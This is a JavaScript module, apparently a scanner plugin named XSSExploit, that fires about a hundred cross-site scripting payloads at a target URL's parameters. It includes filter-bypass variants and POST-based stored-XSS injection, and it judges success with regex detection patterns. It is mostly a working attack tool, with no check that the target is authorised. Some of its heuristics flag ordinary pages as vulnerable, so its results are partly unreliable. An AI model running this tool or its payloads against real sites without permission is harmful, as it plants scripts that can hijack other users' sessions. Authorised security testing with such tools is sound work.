const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');

class XSSExploit {
    constructor() {
        this.displayName = 'XSS Scanner';
        this.description = 'Comprehensive Cross-Site Scripting vulnerability detection and exploitation';
        this.severity = 'high';
        this.category = 'web-application';
        this.version = '2.0.0';

        // XSS payloads categorized by type and context
        this.payloads = {
            // Reflected XSS payloads
            reflected: [
                '<script>alert("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(document.cookie)</script>',
                '<script>alert(document.domain)</script>',
                '<script>alert(window.location)</script>',
                '<script>confirm("XSS")</script>',
                '<script>prompt("XSS")</script>',
                '<script>console.log("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                '<svg onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>'
            ],

            // DOM-based XSS payloads
            dom: [
                '#<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:void(alert("XSS"))',
                'data:text/html,<script>alert("XSS")</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
                'vbscript:alert("XSS")',
                'javascript:/**/alert("XSS")',
                'javascript:%61%6c%65%72%74%28%22%58%53%53%22%29',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//',
                '\';alert(String.fromCharCode(88,83,83));//',
                '</script><script>alert("XSS")</script>',
                '<script>alert("XSS");</script>',
                '<<script>alert("XSS")</script>'
            ],

            // Stored XSS payloads
            stored: [
                '<script>alert("Stored XSS")</script>',
                '<img src=x onerror=alert("Stored XSS")>',
                '<svg onload=alert("Stored XSS")>',
                '<iframe src="javascript:alert(\'Stored XSS\')"></iframe>',
                '<object data="javascript:alert(\'Stored XSS\')"></object>',
                '<embed src="javascript:alert(\'Stored XSS\')">',
                '<link rel=stylesheet href="javascript:alert(\'Stored XSS\')">',
                '<style>@import"javascript:alert(\'Stored XSS\')";</style>',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'Stored XSS\')">',
                '<form><button formaction="javascript:alert(\'Stored XSS\')">CLICK',
                '<input type="image" src=x onerror=alert("Stored XSS")>',
                '<table background="javascript:alert(\'Stored XSS\')">',
                '<div style="background-image:url(javascript:alert(\'Stored XSS\'))">',
                '<base href="javascript:alert(\'Stored XSS\')//">',
                '<bgsound src="javascript:alert(\'Stored XSS\')">'
            ],

            // Filter bypass payloads
            bypass: [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert("XSS")</script>',
                '<SCRIPT>alert("XSS")</SCRIPT>',
                '<script type="text/javascript">alert("XSS")</script>',
                '<script language="javascript">alert("XSS")</script>',
                '<script>/**/alert("XSS")/**/',
                '<script>a=alert;a("XSS")</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
                '<script>window["alert"]("XSS")</script>',
                '<script>top["alert"]("XSS")</script>',
                '<script>parent["alert"]("XSS")</script>',
                '<script>self["alert"]("XSS")</script>',
                '<script>frames["alert"]("XSS")</script>',
                '<script>setTimeout("alert(\'XSS\')",1)</script>',
                '<script>setInterval("alert(\'XSS\')",1)</script>',
                '<script>Function("alert(\'XSS\')")()</script>',
                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
                '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;'
            ],

            // Context-specific payloads
            attribute: [
                '" onmouseover="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\'',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '\' onfocus=\'alert("XSS")\' autofocus=\'',
                '" onclick="alert(\'XSS\')"',
                '\' onclick=\'alert("XSS")\'',
                '" onerror="alert(\'XSS\')"',
                '\' onerror=\'alert("XSS")\'',
                '" onload="alert(\'XSS\')"',
                '\' onload=\'alert("XSS")\'',
                'javascript:alert("XSS")',
                'javascript:void(alert("XSS"))',
                'data:text/html,<script>alert("XSS")</script>'
            ],

            // JavaScript context payloads
            javascript: [
                'alert("XSS")',
                'confirm("XSS")',
                'prompt("XSS")',
                'console.log("XSS")',
                'document.write("XSS")',
                'eval("alert(\'XSS\')")',
                'Function("alert(\'XSS\')")()',
                'setTimeout("alert(\'XSS\')",1)',
                'setInterval("alert(\'XSS\')",1)',
                'window.location="javascript:alert(\'XSS\')"',
                'document.location="javascript:alert(\'XSS\')"',
                'top.location="javascript:alert(\'XSS\')"',
                'parent.location="javascript:alert(\'XSS\')"',
                'self.location="javascript:alert(\'XSS\')"',
                'frames.location="javascript:alert(\'XSS\')"'
            ],

            // CSS context payloads
            css: [
                'expression(alert("XSS"))',
                'expression(confirm("XSS"))',
                'expression(prompt("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                'url(javascript:alert("XSS"))',
                '@import"javascript:alert(\'XSS\')"',
                'behavior:url("javascript:alert(\'XSS\')")',
                '-moz-binding:url("javascript:alert(\'XSS\')")',
                'background-image:url("javascript:alert(\'XSS\')")',
                'list-style-image:url("javascript:alert(\'XSS\')")'
            ]
        };

        // XSS detection patterns
        this.detectionPatterns = [
            // Alert dialog patterns
            /alert\s*\(\s*["']?[^"']*["']?\s*\)/i,
            /confirm\s*\(\s*["']?[^"']*["']?\s*\)/i,
            /prompt\s*\(\s*["']?[^"']*["']?\s*\)/i,

            // Script tag patterns
            /<script[^>]*>.*?<\/script>/si,
            /<script[^>]*>/i,
            /<\/script>/i,

            // Event handler patterns
            /on\w+\s*=\s*["'][^"']*["']/i,
            /on\w+\s*=\s*[^"'\s>]+/i,

            // JavaScript URL patterns
            /javascript\s*:/i,
            /vbscript\s*:/i,
            /data\s*:\s*text\/html/i,

            // Common XSS vectors
            /<iframe[^>]*src\s*=\s*["']?javascript:/i,
            /<object[^>]*data\s*=\s*["']?javascript:/i,
            /<embed[^>]*src\s*=\s*["']?javascript:/i,
            /<link[^>]*href\s*=\s*["']?javascript:/i,
            /<img[^>]*src\s*=\s*["']?javascript:/i,
            /<form[^>]*action\s*=\s*["']?javascript:/i,

            // Encoded patterns
            /&#x?[0-9a-f]+;/i,
            /%[0-9a-f]{2}/i,
            /\\u[0-9a-f]{4}/i,
            /\\x[0-9a-f]{2}/i
        ];

        // Common XSS filters and their bypass techniques
        this.filterBypasses = {
            '<script>': ['<ScRiPt>', '<SCRIPT>', '<%73%63%72%69%70%74>', '&lt;script&gt;'],
            'alert': ['a\\u006cert', 'a\\x6cert', '\\u0061lert', 'window["alert"]'],
            'javascript:': ['java\\u0073cript:', 'java\\x73cript:', 'j\\u0061vascript:'],
            'onerror': ['on\\u0065rror', 'on\\x65rror', 'ON\\u0045RROR'],
            'onload': ['on\\u006coad', 'on\\x6coad', 'ON\\u004cOAD']
        };
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    reflectedXSS: 0,
                    domXSS: 0,
                    storedXSS: 0,
                    filterBypasses: 0
                },
                detailedResults: {}
            };

            console.log(`[XSS] Starting XSS scan on: ${target}`);

            // Parse target and identify testable parameters
            const targetInfo = this.parseTarget(target);
            if (!targetInfo.parameters || targetInfo.parameters.length === 0) {
                // Test for DOM-based XSS even without parameters
                const domResults = await this.testDOMXSS(targetInfo, options);
                results.detailedResults['dom_based'] = domResults;
                results.statistics.totalTests += domResults.tests.length;
                results.statistics.domXSS += domResults.vulnerabilities.length;
                results.vulnerabilities.push(...domResults.vulnerabilities);
            } else {
                console.log(`[XSS] Found ${targetInfo.parameters.length} testable parameters`);

                // Test each parameter for different XSS types
                for (const param of targetInfo.parameters) {
                    console.log(`[XSS] Testing parameter: ${param.name}`);

                    // Reflected XSS testing
                    const reflectedResults = await this.testReflectedXSS(targetInfo, param, options);
                    results.detailedResults[`${param.name}_reflected`] = reflectedResults;
                    results.statistics.totalTests += reflectedResults.tests.length;
                    results.statistics.reflectedXSS += reflectedResults.vulnerabilities.length;
                    results.vulnerabilities.push(...reflectedResults.vulnerabilities);

                    // Filter bypass testing
                    const bypassResults = await this.testFilterBypasses(targetInfo, param, options);
                    results.detailedResults[`${param.name}_bypass`] = bypassResults;
                    results.statistics.totalTests += bypassResults.tests.length;
                    results.statistics.filterBypasses += bypassResults.vulnerabilities.length;
                    results.vulnerabilities.push(...bypassResults.vulnerabilities);

                    // Context-specific testing
                    const contextResults = await this.testContextSpecific(targetInfo, param, options);
                    results.detailedResults[`${param.name}_context`] = contextResults;
                    results.statistics.totalTests += contextResults.tests.length;
                    results.vulnerabilities.push(...contextResults.vulnerabilities);

                    // Test for stored XSS if POST method is available
                    if (options.testStored) {
                        const storedResults = await this.testStoredXSS(targetInfo, param, options);
                        results.detailedResults[`${param.name}_stored`] = storedResults;
                        results.statistics.totalTests += storedResults.tests.length;
                        results.statistics.storedXSS += storedResults.vulnerabilities.length;
                        results.vulnerabilities.push(...storedResults.vulnerabilities);
                    }
                }

                // DOM-based XSS testing
                const domResults = await this.testDOMXSS(targetInfo, options);
                results.detailedResults['dom_based'] = domResults;
                results.statistics.totalTests += domResults.tests.length;
                results.statistics.domXSS += domResults.vulnerabilities.length;
                results.vulnerabilities.push(...domResults.vulnerabilities);
            }

            results.executionTime = Date.now() - startTime;
            console.log(`[XSS] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[XSS] Scan failed:', error.message);
            throw error;
        }
    }

    parseTarget(target) {
        try {
            const url = new URL(target);
            const parameters = [];

            // Extract URL parameters
            for (const [name, value] of url.searchParams.entries()) {
                parameters.push({
                    name,
                    value,
                    type: 'url',
                    location: 'query'
                });
            }

            return {
                protocol: url.protocol,
                host: url.host,
                pathname: url.pathname,
                search: url.search,
                hash: url.hash,
                parameters,
                baseUrl: `${url.protocol}//${url.host}${url.pathname}`
            };
        } catch (error) {
            throw new Error(`Invalid target URL: ${error.message}`);
        }
    }

    async testReflectedXSS(targetInfo, param, options) {
        const results = {
            type: 'reflected',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[XSS] Testing reflected XSS on parameter: ${param.name}`);

        for (const payload of this.payloads.reflected) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime: response.responseTime,
                    statusCode: response.status,
                    contentLength: response.data ? response.data.length : 0,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check if payload is reflected in response
                if (this.isPayloadReflected(response.data, payload)) {
                    const vulnerability = {
                        type: 'Cross-Site Scripting (XSS)',
                        subtype: 'Reflected',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: this.extractXSSEvidence(response.data, payload),
                        impact: 'Malicious script execution in user browsers',
                        recommendation: 'Implement proper output encoding and Content Security Policy',
                        cwe: 'CWE-79',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[XSS] Reflected XSS found: ${param.name} with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testDOMXSS(targetInfo, options) {
        const results = {
            type: 'dom-based',
            tests: [],
            vulnerabilities: []
        };

        console.log(`[XSS] Testing DOM-based XSS`);

        for (const payload of this.payloads.dom) {
            try {
                // Test with hash fragment
                const testUrl = `${targetInfo.baseUrl}${targetInfo.search}#${encodeURIComponent(payload)}`;
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime: response.responseTime,
                    statusCode: response.status,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Analyze for DOM XSS patterns
                if (this.analyzeDOMXSS(response.data, payload)) {
                    const vulnerability = {
                        type: 'Cross-Site Scripting (XSS)',
                        subtype: 'DOM-based',
                        severity: 'high',
                        location: 'URL Fragment',
                        payload,
                        evidence: this.extractDOMXSSEvidence(response.data),
                        impact: 'Client-side script execution through DOM manipulation',
                        recommendation: 'Sanitize DOM input sources and use safe DOM manipulation methods',
                        cwe: 'CWE-79',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[XSS] DOM-based XSS found with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testStoredXSS(targetInfo, param, options) {
        const results = {
            type: 'stored',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[XSS] Testing stored XSS on parameter: ${param.name}`);

        for (const payload of this.payloads.stored) {
            try {
                // Generate unique identifier for tracking
                const uniqueId = crypto.randomBytes(8).toString('hex');
                const trackingPayload = payload.replace('Stored XSS', `StoredXSS_${uniqueId}`);

                // Attempt to store the payload (POST request)
                const postResponse = await this.makePostRequest(targetInfo.baseUrl, {
                    [param.name]: trackingPayload
                }, options);

                // Check if payload was stored by making a GET request
                const getResponse = await this.makeRequest(targetInfo.baseUrl, options);

                const testResult = {
                    payload: trackingPayload,
                    uniqueId,
                    postStatusCode: postResponse.status,
                    getStatusCode: getResponse.status,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check if stored payload is executed
                if (this.isPayloadStored(getResponse.data, trackingPayload, uniqueId)) {
                    const vulnerability = {
                        type: 'Cross-Site Scripting (XSS)',
                        subtype: 'Stored/Persistent',
                        severity: 'critical',
                        parameter: param.name,
                        payload: trackingPayload,
                        evidence: this.extractStoredXSSEvidence(getResponse.data, uniqueId),
                        impact: 'Persistent malicious script execution affecting all users',
                        recommendation: 'Implement strict input validation, output encoding, and Content Security Policy',
                        cwe: 'CWE-79',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[XSS] Stored XSS found: ${param.name} with unique ID: ${uniqueId}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testFilterBypasses(targetInfo, param, options) {
        const results = {
            type: 'filter-bypass',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[XSS] Testing filter bypasses on parameter: ${param.name}`);

        for (const payload of this.payloads.bypass) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime: response.responseTime,
                    statusCode: response.status,
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                // Check if bypass payload is effective
                if (this.isFilterBypassed(response.data, payload)) {
                    const vulnerability = {
                        type: 'Cross-Site Scripting (XSS)',
                        subtype: 'Filter Bypass',
                        severity: 'high',
                        parameter: param.name,
                        payload,
                        evidence: this.extractXSSEvidence(response.data, payload),
                        impact: 'Security filter circumvention leading to script execution',
                        recommendation: 'Implement comprehensive input validation and output encoding',
                        cwe: 'CWE-79',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[XSS] Filter bypass successful: ${param.name} with payload: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testContextSpecific(targetInfo, param, options) {
        const results = {
            type: 'context-specific',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[XSS] Testing context-specific XSS on parameter: ${param.name}`);

        // Test different contexts
        const contexts = ['attribute', 'javascript', 'css'];

        for (const context of contexts) {
            for (const payload of this.payloads[context]) {
                try {
                    const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                    const response = await this.makeRequest(testUrl, options);

                    const testResult = {
                        payload,
                        context,
                        url: testUrl,
                        responseTime: response.responseTime,
                        statusCode: response.status,
                        timestamp: new Date()
                    };

                    results.tests.push(testResult);

                    // Check for context-specific XSS
                    if (this.isContextXSSVulnerable(response.data, payload, context)) {
                        const vulnerability = {
                            type: 'Cross-Site Scripting (XSS)',
                            subtype: `Context-specific (${context})`,
                            severity: 'high',
                            parameter: param.name,
                            payload,
                            context,
                            evidence: this.extractContextXSSEvidence(response.data, payload, context),
                            impact: `Script execution in ${context} context`,
                            recommendation: `Implement context-aware output encoding for ${context}`,
                            cwe: 'CWE-79',
                            owasp: 'A03:2021 – Injection'
                        };
                        results.vulnerabilities.push(vulnerability);
                        console.log(`[XSS] Context-specific XSS found: ${param.name} in ${context} context`);
                    }

                } catch (error) {
                    results.tests.push({
                        payload,
                        context,
                        error: error.message,
                        timestamp: new Date()
                    });
                }

                // Rate limiting
                if (options.delay) {
                    await this.sleep(options.delay);
                }
            }
        }

        return results;
    }

    buildTestUrl(targetInfo, paramName, payload) {
        const url = new URL(targetInfo.baseUrl);

        // Set original parameters
        for (const param of targetInfo.parameters) {
            if (param.name === paramName) {
                url.searchParams.set(param.name, payload);
            } else {
                url.searchParams.set(param.name, param.value);
            }
        }

        return url.toString();
    }

    async makeRequest(url, options = {}) {
        const startTime = Date.now();

        const requestOptions = {
            method: 'GET',
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers
            },
            validateStatus: () => true // Accept all status codes
        };

        const response = await axios(requestOptions);
        response.responseTime = Date.now() - startTime;
        return response;
    }

    async makePostRequest(url, data, options = {}) {
        const requestOptions = {
            method: 'POST',
            url,
            data,
            timeout: options.timeout || 30000,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                ...options.headers
            },
            validateStatus: () => true
        };

        return await axios(requestOptions);
    }

    isPayloadReflected(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Check if the exact payload appears in the response
        if (responseData.includes(payload)) {
            return true;
        }

        // Check for encoded versions
        const encodedPayload = this.htmlEncode(payload);
        if (responseData.includes(encodedPayload)) {
            return true;
        }

        // Check for partial reflection
        const cleanPayload = payload.replace(/<[^>]*>/g, '');
        if (cleanPayload.length > 5 && responseData.includes(cleanPayload)) {
            return true;
        }

        return false;
    }

    isPayloadStored(responseData, payload, uniqueId) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Check for unique identifier in response
        return responseData.includes(uniqueId) || responseData.includes(payload);
    }

    analyzeDOMXSS(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Look for DOM manipulation patterns that could lead to XSS
        const domPatterns = [
            /document\.location/i,
            /window\.location/i,
            /location\.href/i,
            /location\.hash/i,
            /location\.search/i,
            /document\.URL/i,
            /document\.referrer/i,
            /window\.name/i,
            /document\.write/i,
            /innerHTML/i,
            /outerHTML/i,
            /eval\s*\(/i,
            /setTimeout\s*\(/i,
            /setInterval\s*\(/i
        ];

        return domPatterns.some(pattern => pattern.test(responseData));
    }

    isFilterBypassed(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Check if the bypass payload is effective
        return this.detectionPatterns.some(pattern => pattern.test(responseData));
    }

    isContextXSSVulnerable(responseData, payload, context) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        switch (context) {
            case 'attribute':
                return /on\w+\s*=\s*["'][^"']*alert/i.test(responseData);
            case 'javascript':
                return /alert\s*\(\s*["']?[^"']*["']?\s*\)/i.test(responseData);
            case 'css':
                return /expression\s*\(\s*alert/i.test(responseData);
            default:
                return false;
        }
    }

    extractXSSEvidence(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        // Find the location of the payload in the response
        const index = responseData.indexOf(payload);
        if (index !== -1) {
            const start = Math.max(0, index - 50);
            const end = Math.min(responseData.length, index + payload.length + 50);
            return responseData.substring(start, end);
        }

        return 'Payload not found in response';
    }

    extractDOMXSSEvidence(responseData) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        // Extract JavaScript code that could be vulnerable to DOM XSS
        const $ = cheerio.load(responseData);
        const scripts = [];

        $('script').each((i, elem) => {
            const scriptContent = $(elem).html();
            if (scriptContent) {
                scripts.push(scriptContent.substring(0, 200));
            }
        });

        return scripts.length > 0 ? scripts.join('\n') : 'No JavaScript found';
    }

    extractStoredXSSEvidence(responseData, uniqueId) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        const index = responseData.indexOf(uniqueId);
        if (index !== -1) {
            const start = Math.max(0, index - 100);
            const end = Math.min(responseData.length, index + uniqueId.length + 100);
            return responseData.substring(start, end);
        }

        return 'Stored payload not found';
    }

    extractContextXSSEvidence(responseData, payload, context) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        // Use cheerio to parse HTML and extract context-specific evidence
        try {
            const $ = cheerio.load(responseData);

            switch (context) {
                case 'attribute':
                    const elementsWithEvents = $('[onclick], [onmouseover], [onfocus], [onerror], [onload]');
                    return elementsWithEvents.length > 0 ? elementsWithEvents.first().toString() : 'No event handlers found';

                case 'javascript':
                    const scriptTags = $('script');
                    return scriptTags.length > 0 ? scriptTags.first().html() : 'No script tags found';

                case 'css':
                    const styleTags = $('style');
                    return styleTags.length > 0 ? styleTags.first().html() : 'No style tags found';

                default:
                    return this.extractXSSEvidence(responseData, payload);
            }
        } catch (error) {
            return this.extractXSSEvidence(responseData, payload);
        }
    }

    htmlEncode(str) {
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            types: [
                'Reflected XSS',
                'DOM-based XSS',
                'Stored/Persistent XSS',
                'Filter Bypass XSS',
                'Context-specific XSS'
            ],
            contexts: [
                'HTML Context',
                'Attribute Context',
                'JavaScript Context',
                'CSS Context',
                'URL Context'
            ],
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'testStored',
                    description: 'Test for stored XSS vulnerabilities',
                    type: 'boolean',
                    default: false
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            payloadCount: Object.values(this.payloads).reduce((total, arr) => total + arr.length, 0),
            detectionPatterns: this.detectionPatterns.length
        };
    }
}

module.exports = XSSExploit;
